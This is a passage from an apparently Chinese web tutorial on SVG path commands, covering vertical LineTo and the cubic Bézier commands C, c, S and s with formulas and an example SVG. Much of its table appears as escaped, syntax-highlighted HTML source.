		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>公式：<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>Po<span class="hljs-symbol">&amp;prime;</span><span class="hljs-symbol">&amp;nbsp;</span>=<span class="hljs-symbol">&amp;nbsp;</span>Pn<span class="hljs-symbol">&amp;nbsp;</span>= {xo,<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">"row"</span>&gt;</span>v<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>在<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>与<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>指定位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>之间绘制一条垂直线段。<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>指定位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>由<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>沿 y 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>的<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>坐标和<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>的<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>坐标指定。后续子序列的值将被解释为隐式的相对位置的 LineTo（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>v<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）命令的参数。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>公式：<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>Po<span class="hljs-symbol">&amp;prime;</span><span class="hljs-symbol">&amp;nbsp;</span>=<span class="hljs-symbol">&amp;nbsp;</span>Pn<span class="hljs-symbol">&amp;nbsp;</span>= {xo,<span class="hljs-symbol">&amp;nbsp;</span>yo<span class="hljs-symbol">&amp;nbsp;</span>+<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
</code></pre>
</td></tr></tbody></table>
<p>示例</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 200 100"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 使用绝对坐标的 LineTo 命令 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">path</span>
    <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span>
    <span class="hljs-attr">stroke</span>=<span class="hljs-string">"red"</span>
    <span class="hljs-attr">d</span>=<span class="hljs-string">"M 10,10
           L 90,90
           V 10
           H 50"</span> /&gt;</span>

  <span class="hljs-comment">&lt;!-- 使用相对坐标的 LineTo 命令 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">path</span>
    <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span>
    <span class="hljs-attr">stroke</span>=<span class="hljs-string">"red"</span>
    <span class="hljs-attr">d</span>=<span class="hljs-string">"M 110,10
           l 80,80
           v -80
           h -40"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></code></pre>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4adc39e589b944a2a18cf612924ea5a0~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="1246" loading="lazy"/></p>
<h3 id="user-content-三次贝塞尔曲线" data-id="heading-1"><a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="三次贝塞尔曲线" href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSVG%2FReference%2FAttribute%2Fd%23%25E4%25B8%2589%25E6%25AC%25A1%25E8%25B4%259D%25E5%25A1%259E%25E5%25B0%2594%25E6%259B%25B2%25E7%25BA%25BF" title="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#%E4%B8%89%E6%AC%A1%E8%B4%9D%E5%A1%9E%E5%B0%94%E6%9B%B2%E7%BA%BF" target="_blank" ref="nofollow noopener noreferrer">三次贝塞尔曲线</a></h3>
<p><em>三次</em><a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="贝塞尔曲线" href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FGlossary%2FBezier_curve" title="https://developer.mozilla.org/zh-CN/docs/Glossary/Bezier_curve" target="_blank" ref="nofollow noopener noreferrer">贝塞尔曲线</a>是使用四个点定义的平滑曲线：</p>
<p><a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="起始点（当前位置）" href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSVG%2FReference%2FAttribute%2Fd%23%25E8%25B5%25B7%25E5%25A7%258B%25E7%2582%25B9%25EF%25BC%2588%25E5%25BD%2593%25E5%2589%258D%25E4%25BD%258D%25E7%25BD%25AE%25EF%25BC%2589" title="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#%E8%B5%B7%E5%A7%8B%E7%82%B9%EF%BC%88%E5%BD%93%E5%89%8D%E4%BD%8D%E7%BD%AE%EF%BC%89" target="_blank" ref="nofollow noopener noreferrer">起始点（当前位置）</a></p>
<p>(<em>Po</em> = {<em>xo</em>, <em>yo</em>})</p>
<p><a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="终点" href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSVG%2FReference%2FAttribute%2Fd%23%25E7%25BB%2588%25E7%2582%25B9" title="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#%E7%BB%88%E7%82%B9" target="_blank" ref="nofollow noopener noreferrer">终点</a></p>
<p>(<em>Pn</em> = {<em>xn</em>, <em>yn</em>})</p>
<p><a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="起始控制点" href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSVG%2FReference%2FAttribute%2Fd%23%25E8%25B5%25B7%25E5%25A7%258B%25E6%258E%25A7%25E5%2588%25B6%25E7%2582%25B9" title="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#%E8%B5%B7%E5%A7%8B%E6%8E%A7%E5%88%B6%E7%82%B9" target="_blank" ref="nofollow noopener noreferrer">起始控制点</a></p>
<p>(<em>Pcs</em> = {<em>xcs</em>, <em>ycs</em>})（控制在起点附近的曲线的曲率）</p>
<p><a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="终点控制点" href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSVG%2FReference%2FAttribute%2Fd%23%25E7%25BB%2588%25E7%2582%25B9%25E6%258E%25A7%25E5%2588%25B6%25E7%2582%25B9" title="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#%E7%BB%88%E7%82%B9%E6%8E%A7%E5%88%B6%E7%82%B9" target="_blank" ref="nofollow noopener noreferrer">终点控制点</a></p>
<p>(<em>Pce</em> = {<em>xce</em>, <em>yce</em>})（控制在终点附近的曲线的曲率）</p>
<p>绘制后，<em>终点</em>（<em>Pn</em>）将成为下一个命令中的<em>当前位置</em>（<em>Po′</em>）。</p>
<table>
	<tbody>
		<tr>
			<th scope="col">命令</th>
			<th scope="col">参数</th>
			<th scope="col">备注</th>
		</tr>
		<tr>
			<th scope="row">C</th>
			<td>(<code>x1</code>,<code>y1</code>, <code>x2</code>,<code>y2</code>, <code>x</code>,<code>y</code>)+</td>
			<td>
			<p>在<em>当前位置</em>和<em>终点</em> <code>x</code>,<code>y</code> 之间绘制一条三次贝塞尔曲线。<em>起始控制点</em>通过 <code>x1</code>,<code>y1</code> 指定，而<em>终点控制点</em>通过 <code>x2</code>,<code>y2</code> 指定。后续的三元组坐标序列将被解释为隐式的绝对位置的三次贝塞尔曲线（<code>C</code>）命令的参数。</p>
<pre><code class="hljs language-xml" lang="xml">		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">data-link-icon</span>=<span class="hljs-string">"https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8"</span> <span class="hljs-attr">data-link-title</span>=<span class="hljs-string">"公式："</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#%E5%85%AC%E5%BC%8F%EF%BC%9A"</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"公式："</span>&gt;</span>公式：<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Po<span class="hljs-symbol">&amp;prime;</span><span class="hljs-symbol">&amp;nbsp;</span>=<span class="hljs-symbol">&amp;nbsp;</span>Pn<span class="hljs-symbol">&amp;nbsp;</span>= {<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>} ;<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>
		Pcs<span class="hljs-symbol">&amp;nbsp;</span>= {<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>} ;<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>
		Pce<span class="hljs-symbol">&amp;nbsp;</span>= {<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x2<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y2<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">"row"</span>&gt;</span>c<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>(<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx2<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy2<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>)+<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>在<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>和<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>终点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>（<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>终点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>为<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>沿 x 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>以及沿 y 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>处）之间绘制一条三次贝塞尔曲线。<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>起始控制点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>为<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>沿 x 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>以及沿 y 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>处；而<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>终点控制点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>为<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>沿 x 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx2<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>以及沿 y 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy2<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>处。后续的三元组坐标序列将被解释为隐式的相对位置的三次贝塞尔曲线（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>c<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）命令的参数。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">data-link-icon</span>=<span class="hljs-string">"https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8"</span> <span class="hljs-attr">data-link-title</span>=<span class="hljs-string">"公式："</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#%E5%85%AC%E5%BC%8F%EF%BC%9A_2"</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"公式："</span>&gt;</span>公式：<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Po<span class="hljs-symbol">&amp;prime;</span><span class="hljs-symbol">&amp;nbsp;</span>=<span class="hljs-symbol">&amp;nbsp;</span>Pn<span class="hljs-symbol">&amp;nbsp;</span>= {xo<span class="hljs-symbol">&amp;nbsp;</span>+<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span>yo<span class="hljs-symbol">&amp;nbsp;</span>+<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>} ;<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>
		Pcs<span class="hljs-symbol">&amp;nbsp;</span>= {xo<span class="hljs-symbol">&amp;nbsp;</span>+<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span>yo<span class="hljs-symbol">&amp;nbsp;</span>+<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>} ;<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>
		Pce<span class="hljs-symbol">&amp;nbsp;</span>= {xo<span class="hljs-symbol">&amp;nbsp;</span>+<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx2<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span>yo<span class="hljs-symbol">&amp;nbsp;</span>+<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy2<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">"row"</span>&gt;</span>S<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>(<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x2<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y2<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>)+<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>在<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>和<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>终点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>之间绘制一条平滑的三次贝塞尔曲线。<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>终点控制点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>通过<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x2<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y2<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>指定。<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>起始控制点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>是上一条曲线命令的<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>终点控制点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>在<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>上的反射点；若上一条命令不是曲线命令，则其与曲线的起始点（<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>）相同。后续成对的坐标序列将被解释为隐式的绝对位置的平滑三次贝塞尔曲线（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>S<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）命令的参数。<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">"row"</span>&gt;</span>s<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>(<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx2<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy2<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>)+<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>在<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>和<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>终点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>（<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>终点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>为<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>沿 x 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>以及沿 y 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>处）之间绘制一条平滑的三次贝塞尔曲线。<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>终点控制点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>为<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>沿 x 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx2<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>以及沿 y 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy2<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>处。<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>起始控制点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>是上一条曲线命令的<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>终点控制点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>在<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>上的反射点；若上一条命令不是曲线命令，则其与曲线的起始点（<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>）相同。后续成对的坐标序列将被解释为隐式的相对位置的平滑三次贝塞尔曲线（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>s<span class="hljs-tag">&lt;/<span 